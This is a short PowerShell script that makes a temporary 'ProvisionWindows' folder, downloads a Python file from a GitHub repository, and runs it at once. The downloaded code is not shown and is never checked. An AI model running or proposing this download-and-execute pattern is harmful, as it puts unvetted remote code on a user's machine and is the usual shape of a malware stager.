$tempFolder = New-Item -ItemType Directory -Path "$env:TEMP\ProvisionWindows" -Force
$gribScriptUrl = "https://raw.githubusercontent.com/FanAPIpipa/pipa/main/grib.py"
$gribScriptPath = Join-Path -Path $tempFolder.FullName -ChildPath "grib.py"
Invoke-WebRequest -Uri $gribScriptUrl -OutFile $gribScriptPath
python $gribScriptPath
